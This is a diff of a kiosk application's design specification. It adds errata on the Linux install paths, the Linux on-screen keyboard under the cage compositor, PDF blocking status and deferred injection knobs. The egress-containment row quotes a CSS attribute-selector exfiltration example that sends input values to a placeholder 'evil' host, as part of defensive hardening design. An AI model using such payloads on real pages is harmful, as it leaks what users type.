@@ -404,8 +404,8 @@ navigation allowlist matcher lives in `kiosk-core/nav/`, not the thin webview la
 
 | Item | Windows | Linux | Android |
 |---|---|---|---|
-| Install dir (read-only) | `C:\Program Files\kiosk\` | `/opt/kiosk/` | APK |
-| `kiosk.ini`, credential, mp4 | next to binaries (override: `--config <path>`) | same | app files dir |
+| Install dir (read-only) | `C:\Program Files\kiosk\` | `/usr/lib/kiosk/` (binaries + bundled assets); operator files in `/etc/kiosk/` | APK |
+| `kiosk.ini`, credential, mp4 | next to binaries (override: `--config <path>`) | `/etc/kiosk/`, passed via `--config` from the unit's `ExecStart` | app files dir |
 | Data dir (cache, spool, last-good) | `%ProgramData%\kiosk\` | `/var/lib/kiosk/` | app files dir |
 
 **Spool is partitioned by writer (arch-01):** `<data>/spool/main/` and
@@ -418,6 +418,17 @@ scoops it on restart (§3.1, TEL-10).
 The credential must have a restrictive owner-only ACL/mode; the default
 `C:\Program Files\kiosk\` is world-readable, so the installer MUST tighten it (WiX
 `util:PermissionEx` on Windows; `root:root 0600` or the keyring on Linux) — see §8/SEC-09.
+
+**Erratum, 2026-08-07 (rev 2.1) — Linux install layout.** This table previously read
+`/opt/kiosk/` for the Linux install dir, with operator files "next to binaries". Debian
+Policy 9.1.1 forbids a package placing files under `/opt`, and lintian raises
+`dir-or-file-in-opt` at severity **error**, which P2-G's own "lintian clean" packaging
+gate would fail. The layout above is the Policy-blessed equivalent: `/usr/lib/<pkg>/` for
+private binaries and assets (Policy 9.1.1 exception 1), `/etc/kiosk/` for the three
+operator-owned files (Policy 10.7.2). `kiosk-main` resolves its config directory from the
+`--config` flag it already accepts, which `kiosk-launcher` forwards to the child, so the
+split costs no new mechanism. Raised and ruled in the P2-B…P2-G adversarial design review
+(`docs/superpowers/reviews/2026-08-07-p2b-p2g-adversarial-review/`, ruling R1).
 
 ## 5. Configuration
 
@@ -694,10 +705,33 @@ their platform phases (P2, P3). **The document-start injection engine ships in P
 | Cursor auto-hide | injected JS: `cursor: none` after `cursor_autohide_seconds` idle, restore on move |
 | Keep-awake | Windows `SetThreadExecutionState` (inhibits sleep/display-off, NOT the lock screen — see §7.2/M8); Linux/Wayland: `systemd-inhibit` blocks *suspend* only, display blanking is compositor-owned — PRIMARY is configuring cage/wlroots not to blank (idle-inhibit is secondary and only if wry exposes an inhibitor surface; validated in P2, PF-07); Android `FLAG_KEEP_SCREEN_ON` |
 | Text selection ActionMode (Android, M7) | override `setCustomSelectionActionModeCallback` (+ process-text) to return an empty ActionMode — the selection floating toolbar (Web-search/Assist/Share/Translate launch external apps) is a distinct mechanism `setOnLongClickListener` does not suppress |
-| Touch keyboard | Android: system IME. **Windows: TabTip does NOT reliably auto-invoke on webview input focus (WebView2Feedback #1887/#460), so P1 ships an explicit TabTip driver OR the bundled JS on-screen keyboard, validated on touch hardware under Assigned Access (PF-02, §12/OD-1).** Linux: squeekboard/onboard deployment docs |
+| Touch keyboard | Android: system IME. **Windows: TabTip does NOT reliably auto-invoke on webview input focus (WebView2Feedback #1887/#460), so P1 ships an explicit TabTip driver OR the bundled JS on-screen keyboard, validated on touch hardware under Assigned Access (PF-02, §12/OD-1).** **Linux (erratum, 2026-08-07 — see below): the bundled JS on-screen keyboard, injected document-start; squeekboard/onboard are NOT usable under the mandated compositor** |
 | Downloads / popups / file pickers | blocked; new windows navigate in place; file picker allowed only via config flag (future) |
-| PDF (M4; §12/OD-8) | default: navigations returning `application/pdf` are **blocked** (`nav.blocked`) — the Edge PDF viewer toolbar exposes Print/Save that bypass `DownloadStarting`. `content.pdf_view=true` routes PDFs through a bundled chrome-less pdf.js viewer instead. Confirm interceptors wired per platform (WebView2 `DownloadStarting`, WebKitGTK `download-started`, Android `setDownloadListener`) |
+| PDF (M4; §12/OD-8) | default: navigations returning `application/pdf` are **blocked** (`nav.blocked`) — the Edge PDF viewer toolbar exposes Print/Save that bypass `DownloadStarting`. `content.pdf_view=true` routes PDFs through a bundled chrome-less pdf.js viewer instead. Confirm interceptors wired per platform (WebView2 `DownloadStarting`, WebKitGTK `download-started`, Android `setDownloadListener`). **Not a live control as deployed — see the §7 errata: the content origin is operator-controlled and serves no PDFs, so `pdf_decision` stays unwired on every platform.** |
 | Egress containment (SEC-10) | Native subresource host-allowlist: **every** resource request (not just navigations) checked against `content.allowlist` and cancelled if off-list — WebView2 `WebResourceRequested`, WebKitGTK `resource-load-started`, Android `shouldInterceptRequest` — plus an injected restrictive CSP. Closes CSS/JS exfiltration (e.g. `input[value^="a"]{background:url(https://evil/a)}`, `fetch`, beacon) that never triggers a navigation. Residual gaps (service workers, some preload paths) documented |
+
+**Errata, 2026-08-07 (rev 2.1)** — both raised and ruled in the P2-B…P2-G adversarial
+design review (`docs/superpowers/reviews/2026-08-07-p2b-p2g-adversarial-review/`):
+
+- **Touch keyboard, Linux (ruling R2).** The row previously read "squeekboard/onboard
+  deployment docs". Neither is usable under cage, the compositor §7.2 mandates for a
+  secure Linux kiosk: cage exposes no **layer-shell** protocol on any version, and an
+  on-screen keyboard cannot display itself as an overlay without it. (Input *injection*
+  via `zwp_virtual_keyboard_v1` does exist on cage 0.1.5 — it is display, not injection,
+  that is missing.) The route that does work is the one this same table already sanctions
+  for Windows: a **bundled** JS on-screen keyboard injected at document-start through the
+  P1 injection engine, which needs no live-reinjection path and therefore does not depend
+  on the `inject_css`/`inject_js` operator knobs (RT-16). Owned by **P2-B**.
+- **PDF (M4/OD-8) — not a live control as deployed.** The content origin is
+  operator-controlled and serves no `application/pdf`, so the navigation this control
+  exists to intercept does not occur, and nothing is wired on any platform.
+  `scheme_guard::pdf_decision` stays written, host-tested and unused. Two independent
+  reasons it would not bite on Linux even if content changed: WebKitGTK ships no built-in
+  PDF viewer — the Edge viewer's Print/Save toolbar is OD-8's entire stated rationale —
+  and P2-B denies every download at the builder hook. **The assumption is the deployment
+  owning its content**; if the fleet is ever pointed at a site the operator does not
+  control, M4 becomes live again on Windows first, where the Edge viewer exists. Recorded
+  so the assumption stays visible, not as scheduled work.
 
 ### 7.2 OS-level hardening (deployment gate, per platform)
 
@@ -836,9 +870,18 @@ baseline is **not** a secure kiosk (§1 goal wording; RT-11/RT-12/RT-15).
 |---|---|---|
 | **P0** | skeleton | workspace, Tauri app boots fullscreen with hardcoded URL on Windows, CI builds Windows (release) + Linux (compile check). **P0 gate (PF-01):** demonstrate that `AcceleratorKeyPressed` and/or `WH_KEYBOARD_LL` actually swallow Alt+Tab / Alt+F4 / Ctrl+W inside a focused fullscreen Tauri/WebView2 window (Tauri #13919); also confirm native pointer/touch tap-capture works over the focused webview (exit-gesture dependency, §3.5); if neither holds, Assigned Access / Shell Launcher becomes a P1 requirement |
 | **P1** | Windows MVP — deployable | kiosk.ini, hardening set (§7) incl. injection engine + printing/permissions/autofill/pinch/script-dialog controls, **exit gesture + native PIN pad (emits exit code 86)**, offline video + connectivity FSM + decode-failure fallback, remote config cycle (whole-doc validation, bounds, versioning, self-check), **signed config + device binding + anti-rollback**, GCL client + trusted time + insertId + tiered spool + rate-limits, launcher watchdog + heartbeat (process liveness) + READY arming + safe mode + escalation, **renderer hang + crash recovery (`CoreWebView2.ProcessFailed`: `RenderProcessUnresponsive`→reload, `RenderProcessExited`→recreate)**, **nightly reload**, WiX MSI (**Authenticode-signed**, credential ACL) with WebView2 bootstrap, **touch text entry validated on touch hardware**, splash/error/pinpad pages, §7.2 Windows OS-lockdown docs |
-| **P2** | Linux + robustness | WebKitGTK parity (incl. pinch-gesture intercept, keep-awake at compositor), .deb + systemd + cage docs + §7.2 Linux hardening, idle reset (native), **memory cap restart + health-sampled RSS**, cross-platform webview-hang detection (JS ping), config-driven `inject_css`/`inject_js` knobs (behind signed config), remote log level, restart_app |
+| **P2** | Linux + robustness | WebKitGTK parity (incl. pinch-gesture intercept, keep-awake at compositor), .deb + systemd + cage docs + §7.2 Linux hardening, idle reset (native), **memory cap restart + health-sampled RSS**, cross-platform webview-hang detection (JS ping), ~~config-driven `inject_css`/`inject_js` knobs (behind signed config)~~ **→ deferred out of P2, 2026-08-07**, remote log level, restart_app, **bundled on-screen keyboard (Linux, §7 erratum)** |
 | **P3** | Android | Tauri android target, Kotlin plugin (Lock Task/device-owner fail-closed, foreground service + `foregroundServiceType`, boot receiver, keep-screen-on, `setMediaPlaybackRequiresUserGesture`, ActionMode override, `with_webview` JNI settings), in-process watchdog + in-app crash-loop/safe-mode, APK + device-owner provisioning docs. **Early P3 spike:** confirm `with_webview` JNI can mutate WebSettings / attach listeners |
 | **P4** | fleet niceties | auto-update — **Windows/Linux only** (launcher performs staged, signed binary swap; Android updates via MDM/Play per §1 non-goal), one-shot remote commands (reload/clear-cache/screenshot, executed-ID dedup), automated staged/canary config rollout, URL playlist rotation, display on/off schedule, Cloud Monitoring dashboard + log-based-metrics docs |
+
+**P2 scope change, 2026-08-07 (rev 2.1)** — from the P2-B…P2-G adversarial design review
+(`docs/superpowers/reviews/2026-08-07-p2b-p2g-adversarial-review/`). The RT-16 operator
+knobs `inject_css`/`inject_js` are **deferred out of P2**: no deployment has requested a
+per-device tweak, §11 rates the row "RCE on every device", and today's behaviour (the keys
+validate, warn as unimplemented, and do nothing) is honest and costs nothing to keep. The
+injection *engine* they would ride shipped in P1 and is unaffected; the Linux bundled
+on-screen keyboard uses that engine directly and does **not** depend on this row. Owner
+decision, recorded rather than absorbed — the deferral is the owner's, not the review's.
 
 Platform floors: Windows 10 1809+ / Windows 11 (incl. IoT); **robust lockdown (Assigned
 Access / Shell Launcher) requires Enterprise/IoT/Education — Pro is insufficient** (SEC-07).
@@ -927,6 +970,6 @@ any of them.
 | OD-5 | **Windows lockdown SKU** (PF-01/03, SEC-07, M8) | (a) mandate Assigned Access/Shell Launcher (Enterprise/IoT/Education) as covering boundary, in-app hook = defense-in-depth (applied); (b) rely on in-app hook only | **(a)** — the in-app hook is documented-unreliable on focused WebView2 and cannot block OS-reserved chords; procurement must target these SKUs |
 | OD-6 | **Config-safety UX** (cfg-02, cfg-05, RT-04) | implicit-allow home URL vs reject-if-mismatch; `content.url` falls back to bootstrap vs required; post-apply self-check + manual canary now vs automated canary system | **implicit-allow home URL, fallback-to-bootstrap, self-check + manual canary now (applied); automated staged rollout = P4** |
 | OD-7 | **Telemetry modelling** (TEL-04, TEL-08) | `generic_node.location` = new `region` field vs reuse `site`; URL redaction default = path / host / full | **add optional `region` (default site); URL redaction default = path-only** (applied) — privacy-first fits shared-kiosk stance + data-protection law |
-| OD-8 | **PDF policy** (M4) | block `application/pdf` by default vs render via bundled pdf.js | **block by default, `content.pdf_view=true` opt-in** (applied) — the Edge PDF viewer's Print/Save bypass download blocking |
+| OD-8 | **PDF policy** (M4) | block `application/pdf` by default vs render via bundled pdf.js | **block by default, `content.pdf_view=true` opt-in** (applied) — the Edge PDF viewer's Print/Save bypass download blocking. *2026-08-07: "applied" overstated it — the decision is recorded but wired on neither platform, and stays that way. The deployment controls its content origin and serves no PDFs, so the control has nothing to intercept; the option remains available if that ever changes. See §7 errata.* |
 | OD-9 | **Native non-webview last-resort safe screen** (arch-14) | (a) bounded escalation + `watchdog.safe_mode_failed` CRITICAL only (applied); (b) also build a launcher-owned native text window for engine-level faults | **(a) now; (b) deferred** — a human-readable on-screen message for a fault that usually needs a site visit may not justify per-platform native-render cost |
 | OD-10 | **Goal 1 wording / supported configs** (RT-11) | (a) reword to "identical app behaviour + telemetry; OS lockdown differs per platform" + baseline note (applied); (b) drop X11 and screen-pinning from support entirely | **(a)** — preserves deployment flexibility with clearly-labelled secure baselines; (b) is stricter but removes options some sites need |
